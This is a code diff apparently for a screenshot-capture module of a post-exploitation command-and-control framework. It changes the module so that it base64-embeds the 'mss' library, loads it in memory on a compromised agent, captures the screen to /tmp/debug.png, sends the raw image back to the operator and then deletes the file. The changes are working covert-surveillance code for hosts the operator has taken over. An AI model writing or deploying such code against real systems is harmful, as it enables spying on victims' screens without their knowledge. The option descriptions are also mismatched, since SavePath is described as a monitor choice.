@@ -1,3 +1,9 @@
+from zlib_wrapper import compress
+import os
+from lib.common import helpers
+import hashlib
+import base64
+
 class Module:
 
     def __init__(self, mainMenu, params=[]):
@@ -23,7 +29,7 @@ class Module:
             'NeedsAdmin': False,
 
             # True if the method doesn't touch disk/is reasonably opsec safe
-            'OpsecSafe': True,
+            'OpsecSafe': False,
 
             # the module language
             'Language' : 'python',
@@ -44,6 +50,18 @@ class Module:
                 'Description'   :   'Agent to execute module on.',
                 'Required'      :   True,
                 'Value'         :   ''
+            },
+            'SavePath': {
+                # The 'Agent' option is the only one that MUST be in a module
+                'Description'   :   'Monitor to obtain a screenshot. 0 represents all.',
+                'Required'      :   True,
+                'Value'         :   '/tmp/debug.png'
+            },
+            'Monitor': {
+                # The 'Agent' option is the only one that MUST be in a module
+                'Description'   :   'Monitor to obtain a screenshot. -1 represents all.',
+                'Required'      :   True,
+                'Value'         :   '-1'
             }
         }
 
@@ -64,25 +82,31 @@ class Module:
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
 
+        path = self.mainMenu.installPath + "data/misc/python_modules/mss.zip"
+        filename = os.path.basename(path).rstrip('.zip')
+        open_file = open(path, 'rb')
+        module_data = open_file.read()
+        open_file.close()
+        module_data = base64.b64encode(module_data)
         script = """
-try:
-    import Quartz
-    import Quartz.CoreGraphics as CG
-    from AppKit import *
-    import binascii
-except ImportError:
-    print "Missing required module..."
+import os
+import base64
+data = "%s"
+def run(data):
+    rawmodule = base64.b64decode(data)
+    zf = zipfile.ZipFile(io.BytesIO(rawmodule), "r")
+    if "mss" not in moduleRepo.keys():
+        moduleRepo["mss"] = zf
+        install_hook("mss")
+    
+    from mss import mss
+    m = mss()
+    file = m.shot(mon=%s,output='%s')
+    raw = open(file, 'rb').read()
+    run_command('rm -f %%s' %% (file))
+    print raw
 
-onScreenWindows = CG.CGWindowListCreate(CG.kCGWindowListOptionOnScreenOnly, CG.kCGNullWindowID)
-desktopElements = Foundation.CFArrayCreateMutableCopy(None, 0, onScreenWindows)
-imageRef = CG.CGWindowListCreateImageFromArray(CG.CGRectInfinite, desktopElements, CG.kCGWindowListOptionAll)
-rep = NSBitmapImageRep.alloc().initWithCGImage_(imageRef)
-props = NSDictionary()
-imageData = rep.representationUsingType_properties_(NSPNGFileType,props)
-imageString = str(imageData).strip('<').strip('>>').strip('native-selector bytes of')
-hexstring = binascii.hexlify(imageString)
-hex_data = hexstring.decode('hex')
-print hex_data
-"""
+run(data)
+""" % (module_data, self.options['Monitor']['Value'], self.options['SavePath']['Value'])
 
         return script
